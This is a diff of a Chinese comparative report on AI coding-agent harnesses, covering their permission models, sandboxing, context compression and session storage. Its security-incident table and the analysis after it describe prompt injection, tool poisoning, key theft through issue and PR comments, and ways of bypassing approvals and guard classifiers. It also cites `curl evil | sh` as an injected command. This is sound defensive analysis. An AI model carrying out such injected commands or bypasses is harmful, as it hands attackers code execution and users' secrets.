-| Codex | **8.0** | 三档沙箱 `read-only/workspace-write/danger-full-access` × 四档审批 + execpolicy Starlark 前缀规则 | `workspace-write`+`OnRequest`；**沙箱默认开、默认断网** | argv 前缀规则+固定管线（execpolicy→safety→approval→escalate） | 内核+静态规则为主，人/模型为辅 |
-| OpenCode | **6.5** | `allow/ask/deny` 规则引擎、12 个权限键、通配符匹配 | 多数 `allow`；`external_directory`/`doom_loop` 默认 `ask`；`*.env` 默认 `deny` | **最后匹配获胜**（`findLast`），兜底 `ask` | 规则引擎+人审+插件裁决 |
-| Reasonix | **6.5** | allow/ask/deny 规则+workspace sandbox（写限 workspace）+plan mode 只读审计闸 | 写操作过闸 | sandbox+闸 | 规则引擎+人审 |
-| Cline | **6.0** | 细粒度 auto-approve 分类（read/write/execute/browser/MCP）+危险命令硬闸（rm -rf 等永远需批准） | 逐步人审（审批密度最高）；YOLO 为 opt-in 且官方警告 | 无执行隔离 | 人审为主 |
-| grok-build | **5.5** | 六档 PermissionMode（Claude 兼容）+ allow/deny/ask 规则 + Auto 模式 LLM 分类器 + 企业 pin | `Default` 档；**沙箱默认 off** | Claude 兼容规则语义+分类器三态 | 规则+**LLM 分类器（概率性）**+人审 |
-| mini | **4.0** | 三态审批 `ask/auto/never`，仅 3 个 risky 工具过闸 + inode 级路径边界 | `ask`（非交互默认拒） | 无规则表，硬编码顺序（校验→防重→审批） | 人审+硬编码路径检查 |
-| OMP | **3.0** | 三级申报 `read/write/exec` + 用户策略 + 逐工具覆盖 + 安全 override | **`yolo` 全自动**，审批为 opt-in | 固定解析顺序（工具决策→用户策略→override→模式默认） | 模型自律为主，人审/ACP 客户端可选 |
-| Pi | **1.0** | **零内置权限**；审批弹窗被作者视为 security theater | 以启动用户权限全量运行 | 无（`tool_call` 事件可 block，fail-safe 拦截） | 完全外部化（扩展/容器/VM） |
+| 对象        | 坐标    | 内置权限模型（关键证据）                                                                          | 默认姿态                                                                       | 冲突语义                                                      | 裁决者                             |
+| ----------- | ------- | ------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------ | ------------------------------------------------------------- | ---------------------------------- |
+| Claude Code | **8.5** | 七层独立安全层（工具预过滤→deny-first 规则→ML 分类器→shell 沙箱）                                 | deny-first；实测用户批准 93% 权限提示→不以人的警觉为安全前提                   | 多层独立裁决全部满足才执行                                    | 内核+静态规则+ML 分类器+人审       |
+| Codex       | **8.0** | 三档沙箱 `read-only/workspace-write/danger-full-access` × 四档审批 + execpolicy Starlark 前缀规则 | `workspace-write`+`OnRequest`；**沙箱默认开、默认断网**                        | argv 前缀规则+固定管线（execpolicy→safety→approval→escalate） | 内核+静态规则为主，人/模型为辅     |
+| OpenCode    | **6.5** | `allow/ask/deny` 规则引擎、12 个权限键、通配符匹配                                                | 多数 `allow`；`external_directory`/`doom_loop` 默认 `ask`；`*.env` 默认 `deny` | **最后匹配获胜**（`findLast`），兜底 `ask`                    | 规则引擎+人审+插件裁决             |
+| Reasonix    | **6.5** | allow/ask/deny 规则+workspace sandbox（写限 workspace）+plan mode 只读审计闸                      | 写操作过闸                                                                     | sandbox+闸                                                    | 规则引擎+人审                      |
+| Cline       | **6.0** | 细粒度 auto-approve 分类（read/write/execute/browser/MCP）+危险命令硬闸（rm -rf 等永远需批准）    | 逐步人审（审批密度最高）；YOLO 为 opt-in 且官方警告                            | 无执行隔离                                                    | 人审为主                           |
+| grok-build  | **5.5** | 六档 PermissionMode（Claude 兼容）+ allow/deny/ask 规则 + Auto 模式 LLM 分类器 + 企业 pin         | `Default` 档；**沙箱默认 off**                                                 | Claude 兼容规则语义+分类器三态                                | 规则+**LLM 分类器（概率性）**+人审 |
+| mini        | **4.0** | 三态审批 `ask/auto/never`，仅 3 个 risky 工具过闸 + inode 级路径边界                              | `ask`（非交互默认拒）                                                          | 无规则表，硬编码顺序（校验→防重→审批）                        | 人审+硬编码路径检查                |
+| OMP         | **3.0** | 三级申报 `read/write/exec` + 用户策略 + 逐工具覆盖 + 安全 override                                | **`yolo` 全自动**，审批为 opt-in                                               | 固定解析顺序（工具决策→用户策略→override→模式默认）           | 模型自律为主，人审/ACP 客户端可选  |
+| Pi          | **1.0** | **零内置权限**；审批弹窗被作者视为 security theater                                               | 以启动用户权限全量运行                                                         | 无（`tool_call` 事件可 block，fail-safe 拦截）                | 完全外部化（扩展/容器/VM）         |
 
 打分基于第 3–11 章逐一给出的源码坐标（OpenCode `src/permission/index.ts:28-38` 的 `findLast`、grok-build `config.rs:956` 的六档枚举、mini `approve()` L602-613 与 `path()` L722-740 的 `samefile()` inode 比较等），光谱本身是分析工具而非测量结果。Codex 锚定确定性端的理由不是机制数量而是裁决顺序：第一道闸是内核（macOS Seatbelt／Linux bubblewrap+seccomp／Windows 受限令牌），第二道是静态规则（execpolicy，且 `match/not_match` 在加载期强制自测，是九家唯一内建"规则自检"的），第三道才是人/模型，escalate 路径显式化；其残余灵活性出口有二——`OnRequest` 把"何时求人"交给模型判断，`--dangerously-bypass-approvals-and-sandbox` 一键拆光全部防线。OpenCode 的求值本身确定，但两点压低坐标：`findLast` 使语义顺序敏感（见 9.1.2），以及官方 SECURITY.md 自认权限系统 "exists as a UX feature…not designed to provide security isolation"——失去内核背书的规则层管得住工具管不住进程，`edit` deny 可被 `bash` 绕过（issue #21733，官方承认，仍 open）。grok-build 机制数量九家第一却居中，因为两道不确定性都是结构性的：Auto 模式把裁决交给概率性 LLM 分类器（外部实证表明 guard 模型可被注入绕过，见 9.1.3），OS 沙箱存在但默认关闭。mini 的 4.0 来自"硬编码路径检查+人审"的教学三件套；OMP 与 Pi 同处灵活端但姿态相反——OMP 作为 Pi 的 fork 刻意反转上游哲学，把默认信任（yolo）做成产品决策，同时保留 ACP 审批路由"拒绝不静默放行"的确定性挂点；Pi 则是光谱上唯一哲学自洽的极端：harness 不作任何安全承诺，也就不提供可被误认为边界的假象。这条光谱排序的真正含义是：**它排的是默认姿态而非工程能力**——grok-build 证明"内置但默认关"在事故中与"没有"等价（9.1.3），与 OpenCode 自认 UX 层、Claude Code 沙箱空数组 bug（CVE-2025-66479）共同构成"有机制≠有保护"的三个样本。
 
 #### 12.1.2 执行隔离 8 机制×6 对象对照与规则冲突语义三范式
 
-| 机制 | mini | Pi | OMP | OpenCode | Codex | grok-build |
-|---|---|---|---|---|---|---|
-| macOS Seatbelt（`sandbox-exec`） | ❌ | ❌ | ❌ | ❌ | ✅ 默认开 | ✅ 有（nono），默认关 |
-| Linux Landlock | ❌ | ❌ | ❌ | ❌ | 遗留路径 | ✅（nono），默认关 |
-| Linux bubblewrap（mount ns） | ❌ | ❌ | ❌ | ❌ | ✅ 默认开 | ❌ |
-| seccomp-BPF（syscall/断网过滤） | ❌ | ❌ | ❌ | ❌ | ✅ 默认开 | ✅ 仅 Linux 子进程断网 |
-| Windows 受限令牌+ACL | ❌ | ❌ | ❌ | ❌ | ✅ 实验性 | ❌ |
-| 网络隔离（默认断网/白名单代理） | ❌ | 外置（Gondolin egress 策略） | ❌ | ❌（server 仅 Basic Auth） | ✅ 默认断网+MITM 域名白名单 | 沙箱开启时 seccomp 断网 |
-| 容器/microVM 官方方案 | 作者建议独立机器/VM/账号 | ✅ Gondolin microVM 一等扩展 | 用户自理 | 官方建议 Docker/VM（SECURITY.md） | cloud 任务托管容器 | 云沙箱 API（隔离形态未公开） |
-| git worktree（软隔离） | ❌ | ❌ | ✅ pi-iso PAL 七后端兜底链 | ✅ 代码中 "sandbox" 即 worktree | ❌ | ✅ `xai-fast-worktree`（子代理默认 None） |
+| 机制                             | mini                     | Pi                           | OMP                        | OpenCode                          | Codex                       | grok-build                                |
+| -------------------------------- | ------------------------ | ---------------------------- | -------------------------- | --------------------------------- | --------------------------- | ----------------------------------------- |
+| macOS Seatbelt（`sandbox-exec`） | ❌                       | ❌                           | ❌                         | ❌                                | ✅ 默认开                   | ✅ 有（nono），默认关                     |
+| Linux Landlock                   | ❌                       | ❌                           | ❌                         | ❌                                | 遗留路径                    | ✅（nono），默认关                        |
+| Linux bubblewrap（mount ns）     | ❌                       | ❌                           | ❌                         | ❌                                | ✅ 默认开                   | ❌                                        |
+| seccomp-BPF（syscall/断网过滤）  | ❌                       | ❌                           | ❌                         | ❌                                | ✅ 默认开                   | ✅ 仅 Linux 子进程断网                    |
+| Windows 受限令牌+ACL             | ❌                       | ❌                           | ❌                         | ❌                                | ✅ 实验性                   | ❌                                        |
+| 网络隔离（默认断网/白名单代理）  | ❌                       | 外置（Gondolin egress 策略） | ❌                         | ❌（server 仅 Basic Auth）        | ✅ 默认断网+MITM 域名白名单 | 沙箱开启时 seccomp 断网                   |
+| 容器/microVM 官方方案            | 作者建议独立机器/VM/账号 | ✅ Gondolin microVM 一等扩展 | 用户自理                   | 官方建议 Docker/VM（SECURITY.md） | cloud 任务托管容器          | 云沙箱 API（隔离形态未公开）              |
+| git worktree（软隔离）           | ❌                       | ❌                           | ✅ pi-iso PAL 七后端兜底链 | ✅ 代码中 "sandbox" 即 worktree   | ❌                          | ✅ `xai-fast-worktree`（子代理默认 None） |
 
 只有两家把 OS 级沙箱做进 harness 本体：Codex（三平台内核原语、默认开）与 grok-build（基于 nono crate 的 Landlock/Seatbelt+seccomp 断网、默认关）。OpenCode 核心包对 `seatbelt|seccomp|bubblewrap|sandbox-exec` 的 grep 零命中，其代码中的 "sandbox" 实为 git worktree 并行工作区；Pi 哲学性拒绝进程内半成品沙箱（"易被误认为安全边界"），把隔离整体外置为 Gondolin microVM（HTTP/TLS egress 策略、密钥占位注入、可编程 VFS、快照）；OMP 在官方对比页诚实承认威胁模型差异（"Codex sandboxes at the OS…omp gates at the tool boundary"），以工具边界审批+pi-iso worktree+eval 桥 env 剥离（子进程环境默认剥掉常见 API key）补位；mini 止于人审+路径边界，作者本人建议生产使用应在独立机器/VM/账号运行。默认姿态进一步压缩真实差距：开箱即有真隔离的只有 Codex，其余八家都需要用户自行工程（grok-build 加 `--sandbox workspace`、OpenCode 套 Docker 或第三方 wrapper、Pi 搭 Gondolin、OMP 容器化并收紧 approvalMode、mini 换机器）。worktree 一行需要特别辨析：它防的是并行子代理文件互踩（协作隔离），对"模型被注入后执行 `curl evil | sh`"毫无防御力——OpenCode 把 worktree 命名为 "sandbox" 在术语上助长了范畴错误，尽管其 SECURITY.md 语义诚实。隔离层级上 2026 年的共识金字塔是 microVM > 容器 > OS 沙箱 > 权限提示（Northflank 明言单靠共享内核的容器隔离不可信代码"不够"），而内置派与外置派正在合流：Codex 出 `external-sandbox` 策略把强制权交给外层容器，Pi 生态把 Gondolin 做成一等扩展。
 
@@ -1085,25 +1089,25 @@ permission 一列的坐标为分析性打分（0–10，高＝默认即安全、
 
 #### 12.1.3 安全事件总表：17 起事件与"工具链即攻击面"证据链
 
-| # | 时间 | 对象 | 事件（要点） | 攻击面类别 |
-|---|---|---|---|---|
-| 1 | 2025-03 | Cursor/Copilot 生态 | Rules File Backdoor：规则文件藏零宽/Bidi 不可见指令，经模板/PR 分发 | 指令文件供应链 |
-| 2 | 2025-03/04 | MCP 生态 | Tool Poisoning：工具描述嵌指令；批准后改定义（rug pull） | 工具元数据注入 |
-| 3 | 2025-08 | Claude Code | CVE-2025-54795：命令解析错误绕过确认提示 | 命令解析器 |
-| 4 | 2025-09 | Claude Code | CVE-2025-58764：同型解析绕过（NVIDIA Red Team 报告） | 命令解析器 |
-| 5 | 2025-09 | Claude Code | CVE-2025-59041：`git config user.email` 未消毒，trust 对话框前 RCE | 启动信任边界 |
-| 6 | 2025-08 | Codex | CVE-2025-61260：项目 `.env` 设 `CODEX_HOME`+项目 `config.toml` 的 `mcp_servers`，克隆即任意命令执行（0.23.0 修复） | 配置装载/供应链 |
-| 7 | 2025-08 | Copilot | CVE-2025-53773：注入诱使 agent 写 `autoApprove:true` 到自身配置 | 配置自改写 |
-| 8 | 2025-07 | Gemini CLI | 白名单工具投毒：恶意工具自称 `ls` 内嵌 reverse shell | 工具元数据注入 |
-| 9 | 2025-10 | Claude Code | CVE-2025-59536/2026-21852：trust 确认前执行项目代码并发出站请求 | 启动信任边界 |
-| 10 | 2025-09/11 | Claude Code | CVE-2025-59828/65099：Yarn Berry 插件在 trust 评估完成前自动执行 | 启动信任边界 |
-| 11 | 2025-10 | Claude Code | CVE-2025-59829：deny 未计符号链接，symlink 绕过 | 权限规则实现 |
-| 12 | 2025-12 | Claude Code | CVE-2025-66032：`$IFS`/短 flag 解析差异绕过只读校验 | 命令解析器 |
-| 13 | 2025-12 | Gemini CLI Action | PromptPwnd：恶意 issue 正文注入，窃取 `GEMINI_API_KEY`/`GITHUB_TOKEN` | CI/CD 提示注入 |
-| 14 | 2025-12 | Claude Code（sandbox-runtime） | CVE-2025-66479：`allowedDomains:[]` 空数组反转为全网放行；本体未获 CVE、静默修复 | 沙箱配置语义 |
-| 15 | 2026-04 | Claude/Gemini/Copilot Actions | Comment and Control：PR 标题/评论注入跨三家窃 key，GitHub 即 C2 | CI/CD 提示注入 |
-| 16 | 2026-06 | Pi | CVE-2026-54327/54328：auth.json 凭据文件 umask 竞态；`-e` 临时包可预测 tmp 路径（0.78.1 修复） | 凭据存储/扩展装载 |
-| 17 | 2026-07 | grok-build | 全仓库上传事件：整个 git 仓库+历史打成 bundle 经 `/v1/storage` 传 GCS；客户端 UI 开关不在开关链路里 | 遥测/数据出口 |
+| #   | 时间       | 对象                           | 事件（要点）                                                                                                       | 攻击面类别        |
+| --- | ---------- | ------------------------------ | ------------------------------------------------------------------------------------------------------------------ | ----------------- |
+| 1   | 2025-03    | Cursor/Copilot 生态            | Rules File Backdoor：规则文件藏零宽/Bidi 不可见指令，经模板/PR 分发                                                | 指令文件供应链    |
+| 2   | 2025-03/04 | MCP 生态                       | Tool Poisoning：工具描述嵌指令；批准后改定义（rug pull）                                                           | 工具元数据注入    |
+| 3   | 2025-08    | Claude Code                    | CVE-2025-54795：命令解析错误绕过确认提示                                                                           | 命令解析器        |
+| 4   | 2025-09    | Claude Code                    | CVE-2025-58764：同型解析绕过（NVIDIA Red Team 报告）                                                               | 命令解析器        |
+| 5   | 2025-09    | Claude Code                    | CVE-2025-59041：`git config user.email` 未消毒，trust 对话框前 RCE                                                 | 启动信任边界      |
+| 6   | 2025-08    | Codex                          | CVE-2025-61260：项目 `.env` 设 `CODEX_HOME`+项目 `config.toml` 的 `mcp_servers`，克隆即任意命令执行（0.23.0 修复） | 配置装载/供应链   |
+| 7   | 2025-08    | Copilot                        | CVE-2025-53773：注入诱使 agent 写 `autoApprove:true` 到自身配置                                                    | 配置自改写        |
+| 8   | 2025-07    | Gemini CLI                     | 白名单工具投毒：恶意工具自称 `ls` 内嵌 reverse shell                                                               | 工具元数据注入    |
+| 9   | 2025-10    | Claude Code                    | CVE-2025-59536/2026-21852：trust 确认前执行项目代码并发出站请求                                                    | 启动信任边界      |
+| 10  | 2025-09/11 | Claude Code                    | CVE-2025-59828/65099：Yarn Berry 插件在 trust 评估完成前自动执行                                                   | 启动信任边界      |
+| 11  | 2025-10    | Claude Code                    | CVE-2025-59829：deny 未计符号链接，symlink 绕过                                                                    | 权限规则实现      |
+| 12  | 2025-12    | Claude Code                    | CVE-2025-66032：`$IFS`/短 flag 解析差异绕过只读校验                                                                | 命令解析器        |
+| 13  | 2025-12    | Gemini CLI Action              | PromptPwnd：恶意 issue 正文注入，窃取 `GEMINI_API_KEY`/`GITHUB_TOKEN`                                              | CI/CD 提示注入    |
+| 14  | 2025-12    | Claude Code（sandbox-runtime） | CVE-2025-66479：`allowedDomains:[]` 空数组反转为全网放行；本体未获 CVE、静默修复                                   | 沙箱配置语义      |
+| 15  | 2026-04    | Claude/Gemini/Copilot Actions  | Comment and Control：PR 标题/评论注入跨三家窃 key，GitHub 即 C2                                                    | CI/CD 提示注入    |
+| 16  | 2026-06    | Pi                             | CVE-2026-54327/54328：auth.json 凭据文件 umask 竞态；`-e` 临时包可预测 tmp 路径（0.78.1 修复）                     | 凭据存储/扩展装载 |
+| 17  | 2026-07    | grok-build                     | 全仓库上传事件：整个 git 仓库+历史打成 bundle 经 `/v1/storage` 传 GCS；客户端 UI 开关不在开关链路里                | 遥测/数据出口     |
 
 17 起事件按攻击面归类后呈现明显聚集。启动信任边界（#5/9/10，连同 Codex #6 同理）是 2025 年最高产的漏洞模式——"先装载后问信任"使 git config、Yarn 插件、MCP 配置全部在 trust 对话框前执行，其对策已收敛为"trust 先于装载"（Pi 的 project trust 与 grok-build 的 folder_trust 把配置/扩展/钩子的装载本身设为需授权行为，但 Pi 刻意豁免 AGENTS.md/CLAUDE.md，把指令文件注入面官方保留）。命令解析器（#3/4/12）三起 CVE 同型同构：harness 的解析器与真实 shell 的解析器不一致，凡"用字符串分析判断命令是否危险"的设计，解析差异即漏洞——Codex 的架构答案正是把解析降级为"决定问不问"、把内核设为"决定能不能"。Claude Code 以 8 起独立事件（另涉 #15 跨厂商事件）成为事件最多的背景参照，其 CVE 群标示了"权限提示+解析器判断+后补沙箱"路线的极限，也解释了 Anthropic 2025-11 起转向 OS 级沙箱——**从"人审+解析"向"内核强制"迁移是这条证据链的行业主线**，Codex 从第一天就在终点，grok-build 到了终点但没开门。九对象之内，#17 是单一最重要事件：代码与抓包逐字吻合（`upload_config.rs:120` 的 `repo_changes_dedup/v2` 前缀、`.env` 仅作为目录名进跳过清单故文件明文上传），开关链路为 env > requirements pin > config > 远程 flag > 默认开而客户端 UI 不在链路里，止血靠服务端 flag 而不下发新二进制——它同时击穿权限（沙箱默认关）、隔离（无约束）与数据出口（遥测即攻击面）三条线，并证明"开源的代码≠运行的行为"（服务端 flag 可不下发更新即改变客户端行为）。事件链之外，学术实证补完了"工具链即攻击面"的最后一环：双通道注入（工具描述+返回值）对 6 款主流 coding agent 全部取得 RCE、guard 模型"建议不约束"被实证可绕（arXiv 2509.05755，对 grok-build Auto 模式这类"LLM 当门卫"设计构成直接警示）；QueryIPI 查询无关注入成功率 87%；审批疲劳获学术确认（click-fatigue 使用户批量批准恶意命令）；31,132 个技能样本中 26.1% 含至少一个安全漏洞。2025 年的研究重心是"证明能注入"，2026 年已转向"证明防御无效"——两条线索共同指向同一架构结论：确定性防御必须位于模型之外（内核沙箱、网络隔离、凭证隔离），位于模型之内的一切（系统提示、guard 模型、LLM 分类器、人审 UI）均已被实证可绕或可磨穿。
 
@@ -1111,14 +1115,14 @@ permission 一列的坐标为分析性打分（0–10，高＝默认即安全、
 
 #### 12.2.1 压缩策略：六代递进表
 
-| 代 | 对象 | 触发阈值/时机 | 压缩算法 | 关键事实保留 | 破坏性 |
-|---|---|---|---|---|---|
-| 1 | mini | 无阈值——每轮全量重建 prompt，一切文本过字符闸（单输出 4,000/历史 12,000 字符） | 确定性字符截断（无 tokenizer、无 LLM 摘要） | 工作记忆结构 `memory={task, files≤8, notes≤5}` + 旧 read 按 path 去重 | **高**——截断即丢失，无恢复路径 |
-| 2 | Pi | `contextTokens > 窗口 − reserve(16,384)`；overflow 恢复仅允许 1 次 compact+retry | 单级 LLM 摘要：合法切点枚举、**绝不切 toolResult**；split-turn 双摘要 | 文件操作追踪 `CompactionDetails` 跨次累积 + 尾部 20,000 token 原样保留 + 摘要链锚定 | **中**——一次有损但尾部原样，切点纪律保证 tool pair 不拆散 |
-| 3 | OpenCode | `total ≥ input − min(20,000, maxOutputTokens)` | 两级：prune（保护最近 40k/起剪 20k，**默认关**）+ anchored summary（六段模板、摘要上限 4,096 token） | 摘要链锚定（"preserve still-true, remove stale, merge new"）+ 模板强制保留精确路径/错误串 | **中低**——prune 非破坏（存储保留本体），失败不丢会话（#36163） |
-| 4 | grok-build | **85% 窗口阈值** + agent loop 三道闸（采样前/采样失败/工具后） | memory flush 前置 + two-pass prefire（默认关，后台推测性预总结）+ 300s 墙钟摘要预算 | memory flush 显式外置落盘 + `<system-reminder>` 状态格式化 | **中**——full-replace 风格激进，但 flush 先兜底、延迟成本移出关键路径 |
-| 5 | Codex | 按模型自动计算（`model_auto_compact_token_limit`） | 三路径：本地摘要 / 远端 `/responses/compact` **加密 item** / token 预算窗口 | 模型潜在表示即保留机制（不透明 `encrypted_content`，配合 ZDR 全量重放） | **中**——远端路径对模型无损但对**人类不可审计**，provider 锁定 |
-| 6 | OMP | 六条触发路径（`窗口 − max(15%, reserve)` + mid-turn/idle 等） | **snapcompact 位图压缩**：弃 LLM 摘要，被弃历史打印成 PNG 帧按视觉计费（1,568² 帧≈4 万字符≈3,279 image tokens）；前置 prune（40k/20k/`MIN_PRUNE_TOKENS=50`）+ useless 旗标置空 | TTSR 注入存活 + 位图"零摘要损耗" + read 摘要化页脚给出可重读区间 | **两极**——设计上最低破坏（原文不丢、确定性、免 LLM 费），但故障面外移（#3387：端点不支持视觉→会话永久 400） |
+| 代  | 对象       | 触发阈值/时机                                                                    | 压缩算法                                                                                                                                                                       | 关键事实保留                                                                              | 破坏性                                                                                                      |
+| --- | ---------- | -------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ----------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------- |
+| 1   | mini       | 无阈值——每轮全量重建 prompt，一切文本过字符闸（单输出 4,000/历史 12,000 字符）   | 确定性字符截断（无 tokenizer、无 LLM 摘要）                                                                                                                                    | 工作记忆结构 `memory={task, files≤8, notes≤5}` + 旧 read 按 path 去重                     | **高**——截断即丢失，无恢复路径                                                                              |
+| 2   | Pi         | `contextTokens > 窗口 − reserve(16,384)`；overflow 恢复仅允许 1 次 compact+retry | 单级 LLM 摘要：合法切点枚举、**绝不切 toolResult**；split-turn 双摘要                                                                                                          | 文件操作追踪 `CompactionDetails` 跨次累积 + 尾部 20,000 token 原样保留 + 摘要链锚定       | **中**——一次有损但尾部原样，切点纪律保证 tool pair 不拆散                                                   |
+| 3   | OpenCode   | `total ≥ input − min(20,000, maxOutputTokens)`                                   | 两级：prune（保护最近 40k/起剪 20k，**默认关**）+ anchored summary（六段模板、摘要上限 4,096 token）                                                                           | 摘要链锚定（"preserve still-true, remove stale, merge new"）+ 模板强制保留精确路径/错误串 | **中低**——prune 非破坏（存储保留本体），失败不丢会话（#36163）                                              |
+| 4   | grok-build | **85% 窗口阈值** + agent loop 三道闸（采样前/采样失败/工具后）                   | memory flush 前置 + two-pass prefire（默认关，后台推测性预总结）+ 300s 墙钟摘要预算                                                                                            | memory flush 显式外置落盘 + `<system-reminder>` 状态格式化                                | **中**——full-replace 风格激进，但 flush 先兜底、延迟成本移出关键路径                                        |
+| 5   | Codex      | 按模型自动计算（`model_auto_compact_token_limit`）                               | 三路径：本地摘要 / 远端 `/responses/compact` **加密 item** / token 预算窗口                                                                                                    | 模型潜在表示即保留机制（不透明 `encrypted_content`，配合 ZDR 全量重放）                   | **中**——远端路径对模型无损但对**人类不可审计**，provider 锁定                                               |
+| 6   | OMP        | 六条触发路径（`窗口 − max(15%, reserve)` + mid-turn/idle 等）                    | **snapcompact 位图压缩**：弃 LLM 摘要，被弃历史打印成 PNG 帧按视觉计费（1,568² 帧≈4 万字符≈3,279 image tokens）；前置 prune（40k/20k/`MIN_PRUNE_TOKENS=50`）+ useless 旗标置空 | TTSR 注入存活 + 位图"零摘要损耗" + read 摘要化页脚给出可重读区间                          | **两极**——设计上最低破坏（原文不丢、确定性、免 LLM 费），但故障面外移（#3387：端点不支持视觉→会话永久 400） |
 
 递进曲线上的三个跃迁点值得单独命名。其一，**从字符到 token**（mini→Pi）：mini 按字符计费、对真实模型窗口无知，胜在零成本可复现；自 Pi 起全部按 token 估算，触发判定与模型上下文窗口直接挂钩。其二，**从单级摘要到多级防御**（OpenCode/grok-build/OMP）：prune-then-summarize 体现同一思想——先免费剪枝、后付费摘要；grok-build 增加时间维度，two-pass prefire 把压缩延迟从关键路径剥离。其三，**从文本摘要到非文本表示**（Codex/OMP）：加密 item 把压缩物变成模型私有、人类不透明的潜在表示（信任服务端），位图帧把压缩物变成人类可打印、模型视觉读的像素（信任像素）——两者都绕开"摘要必然有损"的文本信息瓶颈，代价分别是不可审计与端点能力门控。须强调这条六代曲线不是价值排序：9.2.3 的外部证据将表明其收益是凹的，mini→Pi 的跃迁价值最大，表示层创新是否划算取决于威胁模型。
 
@@ -1138,15 +1142,15 @@ token 经济学为上述选择定价。不干预时长会话成本随轮次二�
 
 六种存储格式可归为五代范式：①教学级单文件快照（mini：每追加一个事件整体重写 JSON，崩溃不丢已发生事件但工程上低效）→ ②append-only 线性事件日志（grok-build JSONL v1、Codex rollout JSONL）→ ③**树形**事件日志（Pi/OMP：`id/parentId` 构成树，分支为一等公民）→ ④关系型+JSON 列（OpenCode SQLite，v1.2.0 自 JSON 文件迁入）→ ⑤事件溯源（OpenCode sync 层在存储之上再抽象出 replayable event stream）。JSONL 系（②③）与 SQLite/ES 系（④⑤）的分水岭不是容量而是"是否要多客户端并发读/水合/同步"：OpenCode 因 client/server 多表面最先越界，Codex 虽多表面但以"单写者 rollout+thread-store 索引"留在 JSONL 阵营。格式迁移是真实工程风险点：OpenCode 的一次性大迁移换来查询能力但出过会话"消失"事故（issue #13636/#13654，增量升级跳过 JSON→SQLite 导入）；Pi/OMP 选择"读时升级、写时固化"，代价是迁移代码永久背负（Pi 至今保留 v1→v3 全链）；Codex 走第三条路——无显式版本号、靠 serde 枚举兼容性演进，适合其"item 即 API 对象直存、resume 即原样重放"的 rollout 哲学。
 
-| 能力 | mini | Pi | OMP | OpenCode | Codex | grok-build |
-|---|---|---|---|---|---|---|
-| resume | ✅ `--resume latest/<id>` | ✅ `/resume`、启动恢复 | ✅ `-c`/`-r`+终端面包屑 | ✅ 会话持久+server 重连 | ✅ `codex resume`、SDK `thread_resume` | ✅ `/resume`、headless `-s/-r/-c` |
-| 分支（同文件新叶） | ❌ | ✅ `/tree` 导航+branch_summary | ✅ `/branch` | ✅ 消息级 revert/unrevert | ✅ `thread/fork` | ✅ `/fork` |
-| fork（抽支成新文件） | ❌ | ✅ `createBranchedSession`+`parentSession` 互链 | ✅ `/fork`+lineage | ✅ `POST /session/:id/fork` 按 messageID | ✅ 任意点分叉（App Server 三原语之一） | ✅ `session/fork.rs` |
-| 文件状态 checkpoint/回滚 | ❌ | ❌（扩展可加 git checkpointing） | ✅ `checkpoint`/`rewind` 内置工具 | ✅ snapshot git-dir→`/undo` `/redo` | ⚠️ WorldState diff 实验性 | ✅ `/rewind`（RewindPoint） |
-| 压缩检查点入档 | ❌ | ✅ `compaction` entry | ✅ `CompactionEntry`（含 preserveData） | ✅ compaction part | ✅ `Compacted` 条目 | ✅ 压缩为会话内事件 |
-| share | ❌ | ✅ `/share` 上传私有 gist+HTML 链接 | ✅ `/collab` E2E 加密（AES-256-GCM，无第三方审计） | ✅ `opncd.ai/s/<id>`（企业可自托管、可硬禁） | ❌ 本地 rollout 无 share | ✅ `/share` 生成 URL |
-| sync（多设备/云端） | ❌ | ❌ 无内置 | ❌ 本地优先 | ✅ **事件溯源 sync**（九家唯一内置多设备同步） | ✅ cloud 任务天然多端 | ✅ 云端会话恢复（`restorable_turn_number`） |
+| 能力                     | mini                      | Pi                                              | OMP                                                | OpenCode                                       | Codex                                  | grok-build                                  |
+| ------------------------ | ------------------------- | ----------------------------------------------- | -------------------------------------------------- | ---------------------------------------------- | -------------------------------------- | ------------------------------------------- |
+| resume                   | ✅ `--resume latest/<id>` | ✅ `/resume`、启动恢复                          | ✅ `-c`/`-r`+终端面包屑                            | ✅ 会话持久+server 重连                        | ✅ `codex resume`、SDK `thread_resume` | ✅ `/resume`、headless `-s/-r/-c`           |
+| 分支（同文件新叶）       | ❌                        | ✅ `/tree` 导航+branch_summary                  | ✅ `/branch`                                       | ✅ 消息级 revert/unrevert                      | ✅ `thread/fork`                       | ✅ `/fork`                                  |
+| fork（抽支成新文件）     | ❌                        | ✅ `createBranchedSession`+`parentSession` 互链 | ✅ `/fork`+lineage                                 | ✅ `POST /session/:id/fork` 按 messageID       | ✅ 任意点分叉（App Server 三原语之一） | ✅ `session/fork.rs`                        |
+| 文件状态 checkpoint/回滚 | ❌                        | ❌（扩展可加 git checkpointing）                | ✅ `checkpoint`/`rewind` 内置工具                  | ✅ snapshot git-dir→`/undo` `/redo`            | ⚠️ WorldState diff 实验性              | ✅ `/rewind`（RewindPoint）                 |
+| 压缩检查点入档           | ❌                        | ✅ `compaction` entry                           | ✅ `CompactionEntry`（含 preserveData）            | ✅ compaction part                             | ✅ `Compacted` 条目                    | ✅ 压缩为会话内事件                         |
+| share                    | ❌                        | ✅ `/share` 上传私有 gist+HTML 链接             | ✅ `/collab` E2E 加密（AES-256-GCM，无第三方审计） | ✅ `opncd.ai/s/<id>`（企业可自托管、可硬禁）   | ❌ 本地 rollout 无 share               | ✅ `/share` 生成 URL                        |
+| sync（多设备/云端）      | ❌                        | ❌ 无内置                                       | ❌ 本地优先                                        | ✅ **事件溯源 sync**（九家唯一内置多设备同步） | ✅ cloud 任务天然多端                  | ✅ 云端会话恢复（`restorable_turn_number`） |
 
